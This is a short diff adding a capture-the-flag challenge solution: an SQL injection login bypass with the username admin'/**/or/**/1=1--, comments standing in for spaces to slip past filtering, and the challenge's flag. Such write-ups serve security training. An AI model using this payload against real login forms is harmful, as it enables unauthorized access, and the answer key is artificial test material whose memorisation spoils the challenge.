@@ -1,0 +1,10 @@
+CHALLENGE SOLUTION:
+-------------------
+SQL INJECTION
+
+username: admin'/**/or/**/1=1--
+password: <ANYTHING HERE>
+
+/**/ is used to substitute spaces
+
+FLAG: monkeyCTF{ba5ic_5q1_inj3cti0n5}
